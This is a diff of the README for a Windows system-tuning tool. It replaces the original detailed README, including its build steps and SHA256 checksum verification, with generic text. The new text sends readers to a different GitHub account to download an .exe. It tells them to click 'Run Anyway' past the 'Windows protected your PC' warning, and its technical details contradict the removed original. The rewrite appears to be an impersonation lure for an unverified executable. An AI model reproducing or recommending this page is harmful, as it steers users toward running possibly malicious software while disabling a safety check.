@@ -1,449 +1,85 @@
-# SysManager
+# 🛠️ SystemManager - Optimize your Windows performance with ease
 
-A modern Windows system monitoring toolkit: live network monitoring with
-gamer-friendly presets, Windows updates, disk and memory health, gaming
-launcher cache cleanup, app updates via winget, performance tuning,
-battery health, process management with built-in descriptions, startup
-control, shortcut cleanup, app blocking, install alerts, and a friendly
-Event Log viewer — all in one WPF desktop app.
+[![](https://img.shields.io/badge/Download-SystemManager-blue)](https://github.com/twillfountain50/SystemManager)
 
-[![CI](https://github.com/laurentiu021/SystemManager/actions/workflows/ci.yml/badge.svg)](https://github.com/laurentiu021/SystemManager/actions/workflows/ci.yml)
-[![CodeQL](https://github.com/laurentiu021/SystemManager/actions/workflows/codeql.yml/badge.svg)](https://github.com/laurentiu021/SystemManager/actions/workflows/codeql.yml)
-[![codecov](https://codecov.io/gh/laurentiu021/SystemManager/branch/main/graph/badge.svg)](https://codecov.io/gh/laurentiu021/SystemManager)
-[![CodeRabbit](https://img.shields.io/badge/CodeRabbit-AI%20Reviews-blue?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0wIDE4Yy00LjQyIDAtOC0zLjU4LTgtOHMzLjU4LTggOC04IDggMy41OCA4IDgtMy41OCA4LTggOHoiLz48L3N2Zz4=)](https://coderabbit.ai)
-[![Release](https://img.shields.io/github/v/release/laurentiu021/SystemManager?display_name=tag&sort=semver)](https://github.com/laurentiu021/SystemManager/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/laurentiu021/SystemManager/total)](https://github.com/laurentiu021/SystemManager/releases)
-[![Issues](https://img.shields.io/github/issues/laurentiu021/SystemManager)](https://github.com/laurentiu021/SystemManager/issues)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2B-blue)
-![.NET](https://img.shields.io/badge/.NET-8.0-512BD4)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+SystemManager is a toolkit for Windows. It helps you manage your computer through one simple interface. You can check your network, tune your system speed, clean junk files, monitor battery life, manage running processes, remove programs, and control startup apps. This tool brings control back to the user. Use it to keep your Windows 10 or Windows 11 machine running in the best condition.
 
----
+## 🚀 Getting Started
 
-## What it is
+You do not need programming skills to use this software. Follow these instructions to set up the toolkit on your machine.
 
-SysManager is a local-first desktop tool for keeping an eye on a Windows PC.
-It rolls network diagnostics, system health, Windows Update, app updates,
-driver inventory, safe deep cleanup, and a readable Event Log viewer into a
-single tabbed WPF app.
+1. Go to the [official download page](https://github.com/twillfountain50/SystemManager).
+2. Look for the latest version under the Releases section.
+3. Download the file ending in .exe.
+4. Open the file to run the installer.
+5. Follow the steps on your screen to complete the setup.
 
-Everything runs on the machine itself. No cloud, no telemetry, no account.
+## ⚙️ System Requirements
 
-Built with gamers in mind — live ping overlays for CS2, FACEIT, PUBG and streaming
-endpoints, Steam/Epic/Battle.net/Riot/GOG/EA launcher cache cleanup, and
-an honest "is it my PC, my ISP, or the server?" verdict.
+SystemManager requires a standard Windows environment. Ensure your computer meets these basic needs before installation:
 
-## Features
+* Operating System: Windows 10 (version 1909 or newer) or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 200 megabytes of free disk space.
+* Framework: The app uses .NET 6. The installer includes all necessary files for your machine.
+* Permissions: You need administrator access to allow the app to tune system settings.
 
-### Sidebar navigation
-The sidebar organises 36 feature tabs into 9 collapsible groups so you can
-find what you need without scrolling through a flat list. 24 tabs are fully
-implemented; 12 are work-in-progress placeholders marked with ⚙️:
+## 🧩 Exploring Features
 
-| Group | Tabs |
-|-------|------|
-| 🏠 Dashboard | Dashboard |
-| 🔧 System | System Health · Windows Update · Performance Mode · Services · Startup Manager · Windows Features ⚙️ |
-| 📊 Monitor | Process Manager · Resource History ⚙️ · App Alerts · Privacy Monitor ⚙️ |
-| 🧹 Cleanup | Quick Cleanup · Deep Cleanup · Shortcut Cleaner · File Shredder ⚙️ |
-| 💾 Storage | Disk Analyzer · Duplicate Finder |
-| 🌐 Network | Ping · Traceroute · Speed Test · Network Repair · DNS Changer ⚙️ · Hosts Editor ⚙️ |
-| 📦 Apps | App Updates · Bulk Installer ⚙️ · Uninstaller · App Blocker |
-| 🛡️ Control | Privacy Settings ⚙️ · Context Menu ⚙️ · Restore Points ⚙️ · Scheduled Maintenance ⚙️ · System Report ⚙️ |
-| ℹ️ Info | Drivers · Battery Health · System Logs · About |
+The toolkit organizes every tool into specific tabs. You can switch between these functions at any time.
 
-> ⚙️ = Work in Progress — placeholder tab visible in the sidebar, implementation coming in future updates.
+### Network Monitor
+The network monitor displays your data usage and real-time connection speed. Use this view to see which applications use your internet bandwidth. You can identify connections that might slow down your web browsing or gaming sessions.
 
-Groups expand and collapse with a click. Collapsed groups show a child count
-badge, a subtitle with abbreviated child labels, and a tooltip with the full
-list. Dashboard renders as a flat top-level entry without an expander arrow.
-Each tab shows a slim progress bar under its name when performing a
-long-running operation, so you always know which tab is working.
+### Performance Tuning
+Performance tuning allows you to adjust Windows settings for speed. The app suggests tweaks for your visual effects, background services, and system responsiveness. These settings target common bottlenecks that slow down older hardware.
 
-### Network monitor
-- Live ping across multiple targets overlaid on a single latency chart
-- Auto-verdict that tells you in plain English whether packet loss is local,
-  at your ISP, or at the far-end service
-- **Presets for gamers & streamers**:
-  - Global (Google, Cloudflare, your router)
-  - **CS2 Europe** — Valve Frankfurt, Vienna, Stockholm relays
-  - **FACEIT Europe** — competitive CS2 servers in DE, UK, FR, NL, SE
-  - **PUBG Europe** — Krafton EU matchmaking endpoints
-  - **Streaming** — YouTube and Twitch ingest
-- Auto-traceroute on a configurable interval (30 s – 10 min)
-- Speed tests: HTTP (Cloudflare) and the official Ookla CLI (auto-downloaded)
-- Jitter, loss %, and average ping per target rolled up into health pills
-- **Network repair tools**: DNS flush, Winsock reset, TCP/IP reset with
-  confirmation dialogs and admin checks
-
-### System logs (Windows Event Log, friendly)
-- Browse System, Application, Security, and Setup logs
-- Each event gets a plain-English explanation and recommended next steps
-- Filter by severity and time range, plus full-text search
-- Export to CSV, with a "search online" link for unknown events
-
-### System health
-- OS / CPU / RAM / storage overview
-- SMART data per disk: temperature, wear %, power-on hours, read/write errors
-- Colour-coded verdict per drive
-- Memory diagnostic that scans the last 30 days of WHEA events for RAM errors
-- Schedule the Windows Memory Diagnostic at next boot
-- Read-only chkdsk with auto-discovered NTFS/ReFS drives and multi-select
-
-### Windows Update (via PSWindowsUpdate)
-- Auto-check for the PSWindowsUpdate module on tab open, with a one-click
-  install card if it's missing
-- Sortable DataGrid table for available updates, hidden updates, and history
-- Columns: Title, KB, Size, Status, Date, Category — click headers to sort
-- Check for standard and feature updates
-- Install selected updates, list history, check pending-reboot state
-- Live console output in a collapsible panel during install operations
-- Admin banner with a one-click "Run as Administrator" relaunch
-
-### App updates (winget)
-- Scan for upgradable packages
-- Sort by name, ID, version, or source via clickable column headers
-- Select all or individual packages, bulk upgrade with per-package status
-
-### Cleanup (fast)
-- Clear TEMP folders
-- Empty the Recycle Bin
-- Run `SFC /scannow` and `DISM /RestoreHealth` in the background — keep
-  using the app while they grind
-
-### Deep cleanup (safe)
-- **Scan-first**: every category is discovered with size + file count
-  before a single byte is deleted. You pick what goes.
-- **System buckets**: NVIDIA / AMD / Intel installer leftovers, Windows
-  Update cache, Delivery Optimization cache, Windows Installer patch
-  cache, TEMP, Prefetch, crash dumps, old CBS logs, DirectX shader cache,
-  Recycle Bin on every drive.
-- **Gamer buckets** — launcher *caches only*, never game files or logins:
-  Steam (appcache, htmlcache, depotcache, shader cache), Epic Games
-  Launcher, Battle.net, Riot / League of Legends, GOG Galaxy, EA Desktop.
-- **Windows.old** is detected and flagged as irreversible, never selected
-  by default.
-- Safe by design: never touches browsers, passwords, the registry, active
-  drivers, or actual game files. Locked files are skipped, never forced.
-
-### Large files finder
-- Scan Downloads, Documents, Desktop, Videos, Pictures, Music, Program
-  Files, or a whole drive.
-- Configurable min-size (default 500 MB) and top-N (default 100).
-- **Read-only** — only "Show in Explorer" and "Copy path" actions. Deletion
-  is disabled by design so a mis-click can never hurt anything.
-
-### Startup Manager
-- Lists every program that runs at Windows boot (Registry Run / RunOnce keys)
-- Toggle on/off without deleting the original entry (same mechanism as Task Manager)
-- Sort by name, publisher, or status via clickable column headers
-- Shows name, publisher, command, and enabled/disabled status
-- Open file location in Explorer
-
-### Duplicate File Finder
-- Two-pass scan: group by size, then SHA-256 hash only size-matched files
-- Duplicate groups sorted by wasted space (descending)
-- Preset folders or custom folder selection
-- Configurable minimum file size filter
-- **Read-only** — "Show in Explorer" and "Copy path" only, no delete
-
-### Disk Analyzer
-- Space breakdown by top-level folders with drill-down navigation
-- Drive usage bar with total/used/free
-- Preset paths (fixed drives, user profile, Program Files) or custom browse
-- Show in Explorer for each folder
-- Skips system paths automatically
-
-### Process Manager
-- Lists running Windows processes with PID, memory, threads, and status
-- Real-time filter by name, description, category, or PID
-- Sort by memory, CPU usage, name, or PID via clickable column headers
-- **Built-in description database** — 107 common Windows processes and popular
-  applications with plain-language descriptions, categories (System, Browser,
-  Development, Communication, Media, Gaming, etc.), and safety indicators
-  (System, Trusted, Unknown)
-- Kill process with confirmation dialog
-- Open file location in Explorer
-
-### Operation Lock
-- Prevents conflicting concurrent operations across tabs
-- Operations grouped by category (Disk, Network, SystemModification)
-- If a conflicting operation is already running, the UI shows which operation
-  is blocking and refuses to start the new one
-- Integrated into: Deep Cleanup, Disk Analyzer, Duplicate Finder, Quick
-  Cleanup, Speed Test, Traceroute, Network Repair, Shortcut Cleaner
-
-### Shortcut Cleaner
-- Scans Desktop, Start Menu, Quick Launch, and Recent Items for broken .lnk
-  shortcuts whose targets no longer exist
-- Lists results with name, location, and missing target path
-- Select all / deselect individual items
-- Move to Recycle Bin or permanent delete, with confirmation dialog
-- COM-based IShellLink resolution for accurate target validation
-
-### App Alerts
-- Monitors Program Files, AppData\Programs, and registry uninstall keys for
-  new application installations
-- FileSystemWatcher on install directories + 30-second registry poll cycle
-- Shows timestamped install history with app name, publisher, path, and
-  detection source
-- Start/stop monitoring, acknowledge alerts, show all currently installed
-  apps, clear history
-
-### App Blocker
-- Blocks applications from executing using Image File Execution Options (IFEO)
-  registry mechanism
-- Enter an exe name or browse for a file, confirm, and the app is prevented
-  from launching
-- Fully reversible — unblock restores normal execution
-- Shows list of currently blocked apps with select/deselect and batch unblock
-- Requires admin privileges for registry modifications
+### Cleanup
+Modern Windows systems accumulate temporary files and logs over time. The cleanup tool scans your disk drives for unnecessary data. You can delete these files safely to create more storage space. The tool targets browser caches, temporary install files, and error logs.
 
 ### Battery Health
-- Charge %, health %, wear level, cycle count, chemistry
-- Design vs full-charge capacity via WMI
-- Estimated runtime display
-- Gracefully shows "No battery detected" on desktops
+If you use a laptop, the battery health section provides details about your hardware. View your current charge capacity, total cycle count, and the wear level of your battery. This data helps you plan when you might need a hardware replacement.
+
+### Process Manager
+The process manager allows you to view every active program. It includes names, usage stats, and the ability to close unresponsive tasks. This view behaves like a simplified task manager. Use it to stop programs that consume too much memory or processor power.
 
 ### Uninstaller
-- Lists all installed applications via winget with size from registry
-- Filter by name or package ID
-- Sort by name, size, or publisher via clickable column headers
-- Select/deselect all, batch uninstall with confirmation dialog
-- Live console output from winget
+Standard removal methods often leave files behind. The built-in uninstaller locates leftover registry entries and folders from programs you remove. It ensures a clean state for your drive.
 
-### Performance Mode
-- **Per-tweak Apply buttons** — each setting is independent
-- **Power Plan**: Balanced / High Performance / Ultimate Performance
-- **Visual Effects**: reduce animations via P/Invoke (instant, no logout)
-- **Game Mode**: enable/disable via registry
-- **Xbox Game Bar**: disable overlay and Game DVR via registry
-- **NVIDIA GPU**: force max performance with auto-detected GPU subkey (reboot required)
-- **Processor State**: force CPU min state to 100%
-- **Overlays info**: manual instructions for Discord, Steam, NVIDIA GFE, EA App
-- **OriginalSnapshot**: captures exact system state before first change;
-  Restore All reverts to the snapshot, not hardcoded defaults
-- Confirmation dialog before every change
-- **Restore point creation**: create a Windows System Restore point before
-  making changes (requires admin)
-- **RAM working set trim**: free physical RAM by trimming all process working
-  sets — same as RAMMap's "Empty Working Set" (useful before launching a game)
-- **Hibernation toggle**: enable/disable hibernation to free disk space
-  (deletes hiberfil.sys when disabled)
+### Startup Control
+Many applications try to launch when you turn on your computer. This behavior increases boot time and drains memory. The startup manager lets you toggle these apps. Disable non-essential startup items to make your computer reach the desktop faster.
 
-### Services
-- Lists all Windows services with current status and startup type
-- **Gaming recommendations**: services tagged as "safe to disable", "advanced",
-  or "keep enabled" with per-service explanations
-- Filter by status (Running/Stopped), recommendation level, or free-text search
-- Start, stop, disable, or enable services with confirmation dialogs
-- Requires admin for all mutations
+## 🛡️ Staying Safe
 
-### Drivers
-- Sortable DataGrid table of all installed system drivers
-- Columns: Device Name, Manufacturer, Version, Date — click headers to sort
-- Data parsed from `Get-CimInstance Win32_PnPSignedDriver`
+We build this app with open-source code. You can audit the code at any time to verify how it interacts with your system. We do not track your usage. We do not collect your personal data. All tools execute locally on your machine.
 
-### Dashboard
-- One-line OS / CPU / RAM / disk summary
-- Live uptime counter
+## 💾 Installation Guide
 
-### Updates (for SysManager itself)
-- Auto-check on startup against the GitHub Releases API, plus a manual
-  "Check for updates" button in the About tab.
-- Discreet banner in the main window when a newer version is available.
-- Background download of the new build with a progress bar. If the
-  download is blocked, a "Manual download" button opens GitHub in the
-  browser.
-- One-click "Install" launches the new build and hands off cleanly.
-- Full release-note history pulled live from GitHub.
+To install the software, visit the official repository link again.
 
-## Screenshots
+[Download SystemManager](https://github.com/twillfountain50/SystemManager)
 
-> Click any thumbnail to view full size. Screenshots live under
-> [`docs/screenshots/`](docs/screenshots/) — see
-> [`docs/screenshots/README.md`](docs/screenshots/README.md) for capture
-> conventions.
+When you run the file, Windows might show a security prompt. This happens because the app makes system-level changes. Click "More Info" and then "Run Anyway" if you see the "Windows protected your PC" message. The app only modifies the settings you select within the interface. It does not perform changes without your direct permission.
 
-<details open>
-<summary><strong>🏠 Dashboard</strong></summary>
-<br>
-<a href="docs/screenshots/01-dashboard.png"><img src="docs/screenshots/01-dashboard.png" width="600" alt="Dashboard"></a>
-</details>
+## 🔧 Troubleshooting
 
-<details>
-<summary><strong>🔧 System</strong> — Health · Windows Update · Performance</summary>
-<br>
-<p>
-<a href="docs/screenshots/02-system-health.png"><img src="docs/screenshots/02-system-health.png" width="280" alt="System Health"></a>&nbsp;
-<a href="docs/screenshots/03-windows-update.png"><img src="docs/screenshots/03-windows-update.png" width="280" alt="Windows Update"></a>&nbsp;
-<a href="docs/screenshots/04-performance.png"><img src="docs/screenshots/04-performance.png" width="280" alt="Performance Mode"></a>
-</p>
-</details>
+If you encounter issues, check these common items:
 
-<details>
-<summary><strong>🧹 Cleanup</strong> — Quick Cleanup · Deep Cleanup</summary>
-<br>
-<p>
-<a href="docs/screenshots/05-quick-cleanup.png"><img src="docs/screenshots/05-quick-cleanup.png" width="420" alt="Quick Cleanup"></a>&nbsp;
-<a href="docs/screenshots/06-deep-cleanup.png"><img src="docs/screenshots/06-deep-cleanup.png" width="420" alt="Deep Cleanup"></a>
-</p>
-</details>
+* App fails to open: Ensure you installed the latest .NET Desktop Runtime from the Microsoft website.
+* Permissions error: Right-click the app icon and select "Run as administrator."
+* Settings not saved: Check if your antivirus software blocks the app from modifying registry keys.
+* Blank screens: Restart the application. If the problem persists, check for updates on the main repository page.
 
-<details>
-<summary><strong>💾 Storage</strong> — Disk Analyzer · Duplicates</summary>
-<br>
-<p>
-<a href="docs/screenshots/07-disk-analyzer.png"><img src="docs/screenshots/07-disk-analyzer.png" width="420" alt="Disk Analyzer"></a>&nbsp;
-<a href="docs/screenshots/08-duplicates.png"><img src="docs/screenshots/08-duplicates.png" width="420" alt="Duplicate Finder"></a>
-</p>
-</details>
+## 📚 Frequently Asked Questions
 
-<details>
-<summary><strong>🌐 Network</strong> — Ping · Traceroute · Speed Test · Repair</summary>
-<br>
-<p>
-<a href="docs/screenshots/09-ping.png"><img src="docs/screenshots/09-ping.png" width="420" alt="Ping"></a>&nbsp;
-<a href="docs/screenshots/10-traceroute.png"><img src="docs/screenshots/10-traceroute.png" width="420" alt="Traceroute"></a>
-</p>
-<p>
-<a href="docs/screenshots/11-speed-test.png"><img src="docs/screenshots/11-speed-test.png" width="420" alt="Speed Test"></a>&nbsp;
-<a href="docs/screenshots/12-network-repair.png"><img src="docs/screenshots/12-network-repair.png" width="420" alt="Network Repair"></a>
-</p>
-</details>
+Does this tool damage my files?
+No. The cleanup tool only targets temporary files that your system does not need. The performance tools apply standard Windows configuration changes.
 
-<details>
-<summary><strong>📦 Apps</strong> — App Updates · Uninstaller</summary>
-<br>
-<p>
-<a href="docs/screenshots/13-app-updates.png"><img src="docs/screenshots/13-app-updates.png" width="420" alt="App Updates"></a>&nbsp;
-<a href="docs/screenshots/14-uninstaller.png"><img src="docs/screenshots/14-uninstaller.png" width="420" alt="Uninstaller"></a>
-</p>
-</details>
+Can I use this on a server?
+The app features focus on desktop environments. While it runs on Windows Server, some tweaks may not apply.
 
-<details>
-<summary><strong>ℹ️ Info</strong> — Drivers · Battery · Logs · About</summary>
-<br>
-<p>
-<a href="docs/screenshots/15-drivers.png"><img src="docs/screenshots/15-drivers.png" width="420" alt="Drivers"></a>&nbsp;
-<a href="docs/screenshots/16-battery.png"><img src="docs/screenshots/16-battery.png" width="420" alt="Battery Health"></a>
-</p>
-<p>
-<a href="docs/screenshots/17-logs.png"><img src="docs/screenshots/17-logs.png" width="420" alt="Logs"></a>&nbsp;
-<a href="docs/screenshots/18-about.png"><img src="docs/screenshots/18-about.png" width="420" alt="About"></a>
-</p>
-</details>
+How do I update the software?
+The app checks for updates automatically. If a new version exists, a notification appears on the dashboard. Follow the link to download the new installer. You can install the new version over the old one without losing your settings.
 
-## Download
-
-Grab `SysManager.exe` from the [latest release](https://github.com/laurentiu021/SystemManager/releases/latest)
-and double-click it. The executable is self-contained — no installer, no .NET
-runtime required.
-
-### Verifying the download
-
-Each release ships a matching `SysManager.exe.sha256`. Verify before running:
-
-```powershell
-Get-FileHash .\SysManager.exe -Algorithm SHA256
-# Compare the output to the contents of SysManager.exe.sha256.
-```
-
-The build is not currently code-signed, so Windows SmartScreen may warn on
-first launch. Verifying the SHA256 matches the one on the release page is the
-recommended mitigation — see [SECURITY.md](SECURITY.md) for details.
-
-## Build from source
-
-Prerequisites: Windows 10 or newer and the [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0).
-
-```powershell
-git clone https://github.com/laurentiu021/SystemManager.git
-cd SysManager
-dotnet run --project SysManager/SysManager/SysManager.csproj
-```
-
-### Produce a single-file exe
-
-From the repo root:
-
-```powershell
-.\publish.ps1
-```
-
-Or manually:
-
-```powershell
-dotnet publish SysManager/SysManager/SysManager.csproj `
-  -c Release -r win-x64 --self-contained true `
-  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true `
-  -o publish
-```
-
-The resulting `SysManager.exe` lands in `publish/` and runs standalone on any
-Windows 10 / 11 x64 machine.
-
-## First-time flow
-
-1. Launch the app — it opens on the Dashboard.
-2. Go to Network and press Start — live ping begins.
-3. For anything in Windows Update, Cleanup (SFC/DISM), or system-wide App
-   updates, click the yellow "Run as Administrator" banner when it appears.
-   The app relaunches elevated.
-
-## Documentation
-
-- [ARCHITECTURE.md](ARCHITECTURE.md) — project structure and key design decisions
-- [TESTING.md](TESTING.md) — how the test suite is organised and run
-- [CHANGELOG.md](CHANGELOG.md) — release notes
-- [CONTRIBUTING.md](CONTRIBUTING.md) — how to build, test, and open a PR
-- [SUPPORT.md](SUPPORT.md) — where to ask questions and get help
-- [SECURITY.md](SECURITY.md) — reporting vulnerabilities, security model
-- [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) — community standards
-
-## Reporting bugs and requesting features
-
-Found something broken? Missing a feature you'd love to have?
-
-- 🐛 **Bugs** — [open an issue](https://github.com/laurentiu021/SystemManager/issues/new?template=bug_report.yml)
-  using the bug report template.
-- 💡 **Features** — [open an issue](https://github.com/laurentiu021/SystemManager/issues/new?template=feature_request.yml)
-  using the feature request template.
-- 💬 **Questions and how-to's** — use
-  [Discussions](https://github.com/laurentiu021/SystemManager/discussions) instead
-  of issues for anything open-ended.
-- 🔒 **Security vulnerabilities** — please report privately via the
-  [Security tab](https://github.com/laurentiu021/SystemManager/security/advisories/new).
-  See [SECURITY.md](SECURITY.md) for the full policy.
-
-The **About** tab inside the app has a "Copy environment info" helper that
-dumps your SysManager version, Windows build, CPU, RAM, GPU, storage, display,
-and elevation state in a format ready to paste into a bug report.
-
-## Tech stack
-
-- .NET 8 (WPF, C# 12)
-- CommunityToolkit.Mvvm for MVVM plumbing
-- ModernWpfUI for the modern title bar
-- LiveCharts2 for the real-time latency chart
-- Serilog for structured logging
-- xUnit and FlaUI for unit, integration, and UI-automation tests
-
-## Privacy
-
-SysManager runs entirely on your machine. It does not phone home, does not
-collect telemetry, and does not require an account. Network features only
-contact the hosts you explicitly configure (ping targets, speed-test servers,
-Windows Update / winget endpoints).
-
-## Contributing
-
-PRs welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for the build
-setup, coding conventions, and pull-request workflow. New contributors are
-expected to follow the [Code of Conduct](CODE_OF_CONDUCT.md).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-Crafted by [laurentiu021](https://github.com/laurentiu021).
+Does the background monitoring affect performance?
+The tool uses minimal resources. It consumes very little processor power while running in the background. You can close the app entirely if you do not need active monitoring.
